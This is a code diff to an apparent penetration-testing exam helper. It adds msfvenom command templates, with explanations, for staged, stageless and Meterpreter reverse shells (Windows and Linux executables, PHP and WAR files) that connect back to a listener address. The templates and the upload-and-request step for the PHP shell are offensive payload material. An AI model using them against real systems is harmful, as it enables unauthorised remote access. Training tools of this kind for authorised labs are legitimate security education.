@@ -2,15 +2,27 @@ import type { PayloadDef, PayloadPart } from "./types";
 
 /**
  * msfvenom runs on Kali, so every def is pasted at a bash prompt; `os` is the TARGET the file is for.
- * Stageless `shell_reverse_tcp` only: no meterpreter, no staged `shell/reverse_tcp` (exam rule).
+ * Staged, stageless and Meterpreter payloads. Nothing is banned on the exam; Meterpreter is limited to one machine (msfLock.ts).
  */
 const NO_HANDLER = "Catch it with penelope, or nc; no multi/handler needed for stageless shell.";
+const NEEDS_HANDLER = "Catch it with multi/handler: nc and penelope can't serve a stage or speak Meterpreter.";
 const ARCH_NOTE = "Check the target first (systeminfo System Type / uname -m): an x64 file will not run on x86.";
+
+const STAGED = "A slash before the last part (shell/reverse_tcp) means staged: the file is a small stager that fetches the rest, so only multi/handler can catch it.";
+const STAGELESS = "An underscore (shell_reverse_tcp) means stageless: the whole shell is in the file, so nc or penelope can catch it.";
+const METER_STAGELESS = "meterpreter_reverse_tcp (underscore) is stageless Meterpreter: the whole agent is in the file, bigger but one connection. Catch it with multi/handler.";
+const METER_STAGED = "meterpreter/reverse_tcp (slash) is staged: the file is a small stager that pulls Meterpreter from multi/handler.";
+
+function pExplain(payload: string): string {
+  if (payload.includes("meterpreter_")) return METER_STAGELESS;
+  if (payload.includes("meterpreter/")) return METER_STAGED;
+  return /\/shell\//.test(payload) ? STAGED : STAGELESS;
+}
 
 function parts(payload: string, fmt: string, file: string, fmtExplain: string): PayloadPart[] {
   return [
     { token: "msfvenom", explain: "Metasploit's standalone payload generator. It only writes a file; Metasploit itself is not started." },
-    { token: `-p ${payload}`, explain: "-p: the payload. The underscore in shell_reverse_tcp means stageless: the whole shell is in the file, so nc or penelope can catch it. A slash (shell/reverse_tcp) would be staged and die on nc." },
+    { token: `-p ${payload}`, explain: `-p: the payload. ${pExplain(payload)}` },
     { token: "LHOST={LHOST}", explain: "Your listener's IP, baked into the file. Use the tun0 address and regenerate after any VPN reconnect." },
     { token: "LPORT={LPORT}", explain: "The port your listener waits on, baked into the file." },
     { token: `-f ${fmt}`, explain: fmtExplain },
@@ -19,15 +31,17 @@ function parts(payload: string, fmt: string, file: string, fmtExplain: string): 
 }
 
 function def(
-  id: string, title: string, os: "linux" | "windows", payload: string, fmt: string, file: string,
-  fmtExplain: string, notes: string[] = [],
+  id: string, title: string, os: "linux" | "windows" | "any", payload: string, fmt: string, file: string,
+  fmtExplain: string, notes: string[] = [], opts: { handlerOnly?: boolean; meterpreter?: boolean } = {},
 ): PayloadDef {
   return {
     id, generator: "msfvenom", title, os, contexts: ["bash-prompt"], requires: ["served-file"],
     template: `msfvenom -p ${payload} LHOST={LHOST} LPORT={LPORT} -f ${fmt} -o {FILE}`,
     parts: parts(payload, fmt, file, fmtExplain),
-    listener: "penelope", bakesIp: true, defaults: { FILE: file },
-    notes: [NO_HANDLER, ...notes],
+    listeners: opts.handlerOnly ? ["multi-handler"] : ["penelope", "multi-handler", "rlwrap-nc"],
+    msfPayload: payload, bakesIp: true, defaults: { FILE: file },
+    ...(opts.meterpreter ? { meterpreter: true } : {}),
+    notes: [opts.handlerOnly ? NEEDS_HANDLER : NO_HANDLER, ...notes],
   };
 }
 
@@ -53,4 +67,17 @@ export const MSFVENOM: PayloadDef[] = [
   // must not fold it as "Wrong OS", and a Linux one must not either.
   def("msf-java-war-linux", "Java WAR (Tomcat on Linux)", "linux", JAVA, "war", "rev.war", WAR_FMT, [WAR_NOTE, "Same payload as the Windows entry; listed per OS so the fit filter keeps it."]),
   def("msf-java-war-windows", "Java WAR (Tomcat on Windows)", "windows", JAVA, "war", "rev.war", WAR_FMT, [WAR_NOTE, "Same payload as the Linux entry; listed per OS so the fit filter keeps it."]),
+
+  def("msf-win-x64-met-staged", "Windows x64 Meterpreter (staged)", "windows", "windows/x64/meterpreter/reverse_tcp", "exe", "met.exe",
+    "-f exe: a Windows PE executable.", [ARCH_NOTE], { handlerOnly: true, meterpreter: true }),
+  def("msf-win-x64-met-stageless", "Windows x64 Meterpreter (stageless)", "windows", "windows/x64/meterpreter_reverse_tcp", "exe", "met.exe",
+    "-f exe: a Windows PE executable.", [ARCH_NOTE], { handlerOnly: true, meterpreter: true }),
+  def("msf-win-x64-shell-staged", "Windows x64 shell (staged)", "windows", "windows/x64/shell/reverse_tcp", "exe", "rev-staged.exe",
+    "-f exe: a Windows PE executable.", [ARCH_NOTE], { handlerOnly: true }),
+  def("msf-linux-x64-met-staged", "Linux x64 Meterpreter (staged)", "linux", "linux/x64/meterpreter/reverse_tcp", "elf", "met.elf",
+    "-f elf: a Linux executable. chmod +x it on the target before running.", [ARCH_NOTE], { handlerOnly: true, meterpreter: true }),
+  def("msf-linux-x64-met-stageless", "Linux x64 Meterpreter (stageless)", "linux", "linux/x64/meterpreter_reverse_tcp", "elf", "met.elf",
+    "-f elf: a Linux executable. chmod +x it on the target before running.", [ARCH_NOTE], { handlerOnly: true, meterpreter: true }),
+  def("msf-php-met", "PHP Meterpreter", "any", "php/meterpreter/reverse_tcp", "raw", "met.php",
+    "-f raw: plain PHP source, no wrapper. Upload it to a PHP-executing path and request it.", [], { handlerOnly: true, meterpreter: true }),
 ];
